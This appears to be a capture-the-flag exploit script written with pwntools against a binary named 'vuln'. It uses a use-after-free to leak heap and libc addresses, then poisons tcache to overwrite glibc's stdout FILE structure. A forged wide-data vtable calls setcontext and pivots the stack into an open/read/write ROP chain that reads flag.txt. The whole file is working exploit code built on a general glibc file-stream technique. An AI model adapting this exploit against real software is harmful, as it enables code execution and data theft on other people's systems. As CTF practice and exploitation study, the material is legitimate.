from pwn import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
conn = process()
#gdb.attach(conn)
#conn = remote("34.32.169.73", 1337)

def alloc(idx, size, content=b"aaa"):
  conn.sendlineafter(b">", b"1")
  conn.sendlineafter(b":", str(idx).encode())
  conn.sendlineafter(b":", str(size).encode())
  conn.sendlineafter(b":", content)

def free(idx):
  conn.sendlineafter(b">", b"2")
  conn.sendlineafter(b":", str(idx).encode())

def puts(idx):
  conn.sendlineafter(b">", b"3")
  conn.sendlineafter(b": ", str(idx).encode())
  return conn.recvline()

for i in range(7):
  alloc(i, 0x200)
alloc(7, 0x200)
alloc(8, 0x200)
alloc(9, 0x10)

for i in range(7):
  free(i)

heap = u64(puts(0)[:-1] + b"\0\0\0") << 12
info("heap @ " + hex(heap))

# clear the unsorted bin
for n in range(5):
  alloc(1, 0x100)

free(8)
free(7)

libc.address = u64(puts(8)[:-1] + b"\0\0") - 0x219ce0
info("libc @ " + hex(libc.address))

# prep ropchain for later
rop = ROP(libc)
rop.raw(rop.ret) # padding for what gets pushed
rop.read(0, libc.bss(42), 0x100)
rop.call(libc.sym.syscall, [constants.SYS_open, libc.bss(42)])
rop.read(3, libc.bss(42), 0x100)
rop.write(1)

alloc(10, 0x200, rop.chain())
free(8)

stdout = libc.sym._IO_2_1_stdout_
wfile_overlow_vtable_ptr = libc.address + 0x216018
call_gadget = libc.address + 0x1675b0
setcontext = libc.address + 0x53a6d


fake = FileStructure(0)
fake.flags = 0
fake._IO_read_ptr = stdout - 0x10 # value to be set in rdx for setcontext
fake._IO_read_end = setcontext
fake._IO_read_base = 0
fake._IO_write_base = 0 # rdx+0x20
fake._IO_write_ptr = 0
fake._IO_write_end = 0
fake._IO_buf_base = 0
fake._IO_save_base = 0
fake._IO_backup_base = 0
fake._IO_save_end = 0
fake.markers = 0
fake.chain = 0
fake.fileno = 0
fake._flags2 = 0
fake._old_offset = -1
fake._cur_column = 0
fake._vtable_offset = 0
fake._shortbuf = 0
fake.unknown1 = 0
fake._lock = libc.address + 0x21a8ca
fake._offset = heap + 0xf70 # pivot stack to heap
fake._codecvt = rop.find_gadget(["ret"])[0] # rcx (gets pushed -> first of ropchain)
fake._wide_data = heap + 0x1390 # fake _wide_data
fake.unknown2 = p64(0)*2 + p64(libc.address + 0x21a7a0) + p64(0)*3
fake.vtable = wfile_overlow_vtable_ptr - 0x38

wfake = b"\0"*232 + p64(heap + 0x1390 + 240) # fake wide_data
wfake += b"\0"*112 + p64(call_gadget) # fake wide_vtable

alloc(11, 0x410, b"a"*512 + p64(0) + p64(0x111) + p64((stdout) ^ ((heap>>12)+1)))
alloc(12, 0x200, bytes(wfake)[8:])
alloc(13, 0x200, bytes(fake))

conn.sendline(b"flag.txt\0")

conn.interactive()
